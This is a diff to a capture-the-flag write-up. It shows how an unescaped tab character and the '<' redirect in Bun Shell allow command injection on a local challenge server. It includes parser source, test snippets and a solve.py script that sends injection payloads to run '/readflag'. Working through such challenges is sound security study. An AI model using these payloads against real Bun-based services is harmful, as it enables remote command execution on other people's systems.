@@ -133,7 +133,7 @@
  # Exploit
  ## Documentation
  - According to the [document](https://bun.sh/docs/runtime/shell), Bun Shell acts like a bash shell. It has an alias "$" that call the Shell object directly. Notably, the shell will escape all string by default, prevent command injection attack.
- - After reading the document, it can be clearly seen that the shell interprete the string inside backtick `` as shell command. Let's give it a try:
+ - After reading the document, it can be clearly seen that the shell interprete the string inside backtick `` as a subshell. Let's give it a try:
 
    ![image](https://github.com/user-attachments/assets/1637a199-72f0-48eb-a897-856b73354ea7)
 
@@ -163,4 +163,139 @@
 
   ![image](https://github.com/user-attachments/assets/86b8b199-d380-438f-9884-3c4fdde15bd1)
 
-- In bash shell, there were some special characters that treated by the shell as white-space. One of them was \t character.
+- In bash shell, there were some special characters that treated by the shell as white-space. One of them was \t character. For example, I tried to echo a string included \t character. let's see what happened:
+  ```bash
+  test="This    is  a   test    string"
+  ```
+  ![image](https://github.com/user-attachments/assets/c60890fe-f50e-4a3b-8e1d-b3c9bbcbefc2)
+
+- It is clearly that the bash shell treated \t as a space. How about Bun shell? This is my *test.js* file for testing:
+  ```javascript
+  const { $ } = require("bun")
+
+  var output = async () => {
+      var x = await $`echo This    is  a   test    string`.text();
+      return x;
+  }
+  output().then(result => {
+      console.log(result);
+  })
+  ```
+  ![image](https://github.com/user-attachments/assets/cfca8e9d-bd29-4875-a8b9-c0d1f80ec9c8)
+
+- The result indicate that we can use the tab character as a space. The SPECIAL_CHARS array (which used by Bun Shell for escaping reason) does not have \t, so it will not be escaped. But it's not as easy as I think:
+
+  ![image](https://github.com/user-attachments/assets/6e89f336-e03c-49b9-abfd-b161d03ec0f2)
+
+  ![image](https://github.com/user-attachments/assets/52cbe8ec-e310-4927-8387-75ca53d297d9)
+
+- The shell accepted that payload, but ... nothing happened. I don't know why the subshell did not executed it, but when I send the payload ```man%09ls``` to the server, it also did not run, so I guess if the subshell contains an extra cmd line argument, the process will exit.
+- On the other hand, there is a noticeable function in src/shell/shell.zig:
+  ```zig
+  // TODO Arbitrary file descriptor redirect
+        fn eat_redirect(self: *@This(), first: InputChar) ?AST.RedirectFlags {
+            var flags: AST.RedirectFlags = .{};
+            switch (first.char) {
+                '0' => flags.stdin = true,
+                '1' => flags.stdout = true,
+                '2' => flags.stderr = true,
+                // Just allow the std file descriptors for now
+                else => return null,
+            }
+            var dir: RedirectDirection = .out;
+            if (self.peek()) |input| {
+                if (input.escaped) return null;
+                switch (input.char) {
+                    '>' => {
+                        _ = self.eat();
+                        dir = .out;
+                        const is_double = self.eat_simple_redirect_operator(dir);
+                        if (is_double) flags.append = true;
+                        if (self.peek()) |peeked| {
+                            if (!peeked.escaped and peeked.char == '&') {
+                                _ = self.eat();
+                                if (self.peek()) |peeked2| {
+                                    switch (peeked2.char) {
+                                        '1' => {
+                                            _ = self.eat();
+                                            if (!flags.stdout and flags.stderr) {
+                                                flags.duplicate_out = true;
+                                                flags.stdout = true;
+                                                flags.stderr = false;
+                                            } else return null;
+                                        },
+                                        '2' => {
+                                            _ = self.eat();
+                                            if (!flags.stderr and flags.stdout) {
+                                                flags.duplicate_out = true;
+                                                flags.stderr = true;
+                                                flags.stdout = false;
+                                            } else return null;
+                                        },
+                                        else => return null,
+                                    }
+                                }
+                            }
+                        }
+                        return flags;
+                    },
+                    '<' => {
+                        dir = .in;
+                        const is_double = self.eat_simple_redirect_operator(dir);
+                        if (is_double) flags.append = true;
+                        return flags;
+                    },
+                    else => return null,
+                }
+            } else return null;
+        }
+  ```
+- The function tell us that the shell also support IO redirect using > and <. The output redirect character ">" is in the SPECIAL_CHARS array mentioned above, but "<" is not, so we have an arbitrary file write here. We can setup a simple test:
+
+  ![image](https://github.com/user-attachments/assets/6c9e7667-44bb-4db0-87e4-2027d771e4d6)
+  ![image](https://github.com/user-attachments/assets/31abdbdb-e72c-4102-b26c-79555b0da6e0)
+
+- We can see that ```lmao``` was created, with the string "whoami" inside. So, we should try to redirect the content of that file to ```sh```:
+
+  ![image](https://github.com/user-attachments/assets/78d35e19-516d-4a53-a992-bcc072fe41c1)
+  => The command has been executed.
+
+# Cat the flag
+- With all the information collected, the exploit will be:
+    1. Created a file with the content: "/readflag give me the flag" using the behavior where the \t character is treated as space character.
+    2. Redirect the file content to sh, then use backtick to spawn a subshell to execute it.
+
+  ```python
+  # solve.py
+  #!/usr/bin/python3
+  import requests
+  
+  PORT = 59950
+  URL = f"http://127.0.0.1:{PORT}/echo"
+  
+  requests.post(
+      url = URL,
+      data = "msg=/readflag\tgive\tme\tthe\tflag1<lmao",
+      headers = {
+          "Content-Type" : "application/x-www-form-urlencoded"
+      }
+  )
+  
+  r = requests.post(
+      url = URL,
+      data = "msg=`sh<lmao`",
+          headers = {
+          "Content-Type" : "application/x-www-form-urlencoded"
+      }
+  )
+  
+  print(r.text)
+  ```
+
+  ![image](https://github.com/user-attachments/assets/45f6be8d-b011-4838-a04b-599da7a0f091)
+
+# Note
+- Bun is a JS package based on Zig programming language, which is considered as better version of C language. String in Zig is terminated with a null character like C, so it's vulnerable to nullbyte injection. In the payload below, we can see the difference between the two payload: one has nullbyte, and one doesn't:
+
+  ![image](https://github.com/user-attachments/assets/b49670b9-9af3-4f5c-ac5d-7955037d83e0)
+  ![image](https://github.com/user-attachments/assets/aa2592a7-51df-4a17-9d24-07c9d4972e8c)
